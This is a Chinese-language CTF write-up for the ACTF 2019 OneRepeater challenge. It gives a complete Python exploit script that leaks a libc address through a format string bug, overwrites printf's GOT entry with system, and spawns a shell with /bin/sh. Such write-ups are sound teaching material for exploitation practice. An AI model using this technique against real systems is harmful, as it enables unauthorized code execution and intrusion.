# ACTF_2019_OneRepeater



### 解题思路

什么保护都没有，几乎是白给。经典的格式化字符串，这里选择修改`printf`的`got`表内容为`system`然后再输入`/bin/sh`拿`shell`

<!-- more -->

### exp

```python
from pwncli import *

cli_script()

p = gift['io']
libc = gift['libc']

def fmt_attack(p, fmt):
    p.sendlineafter("3) Exit\n", "1")
    p.sendline(fmt)
    p.sendlineafter("3) Exit\n", "2")
    msg = p.recvline()
    info("msg recv: {}".format(msg))
    return msg


msg = fmt_attack(p, "%275$p")
libc_base_addr = int16(msg.decode()) - libc.sym['__libc_start_main'] -241

libc.address = libc_base_addr
log_address("libc_base_addr", libc_base_addr)

payload = fmtstr_payload(offset=16, writes={0x804a010:libc.sym['system']}, write_size="short", write_size_max="short")

fmt_attack(p, payload)


p.sendlineafter("3) Exit\n", "1")
p.sendline("/bin/sh")
p.sendlineafter("3) Exit\n", "2")

p.interactive()
```

### 引用与参考
1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://www.roderickchan.cn/zh-cn/2021-08-14-actf-2019-onerepeater/  

